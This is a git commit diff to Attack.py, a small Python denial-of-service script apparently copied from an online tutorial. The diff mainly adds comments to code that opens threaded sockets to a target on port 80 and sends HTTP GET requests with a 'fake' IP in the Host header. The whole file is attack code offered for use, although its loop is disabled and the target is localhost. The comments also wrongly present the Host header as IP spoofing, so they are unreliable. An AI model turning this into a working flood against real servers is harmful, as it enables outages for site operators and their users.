3ae64a5b8f06364fde4fbdbb1ea908d364ca6225
Jadosman98 <73310879+Jadosman98@users.noreply.github.com>
2020-10-23 00:28:34 +0300

    Update Attack.py

--- Attack.py
+++ Attack.py
@@ -1,18 +1,18 @@
-
+#https://www.neuralnine.com/code-a-ddos-script-in-python/
 import socket
 import threading
-
+#the attack is very straightforward
 targetIP = '127.0.0.1'
 fakeIP = '182.21.20.32'
 port = 80
 def ddos():
     #while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((targetIP, port))
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #open a socket 
+        s.connect((targetIP, port)) #connect to the targeted ip and port to attack him
         s.sendto(("GET /" + targetIP + " HTTP/1.1\r\n").encode('ascii'), (targetIP, port))
-        s.sendto(("Host: " + fakeIP + "\r\n\r\n").encode('ascii'), (targetIP, port))
+        s.sendto(("Host: " + fakeIP + "\r\n\r\n").encode('ascii'), (targetIP, port)) 
         s.close()
-
+        # sending an hhtp request(because in this case we are attacking port 80) using the fake ip
 for i in range(10):
      thread = threading.Thread(target=ddos)
      thread.start()
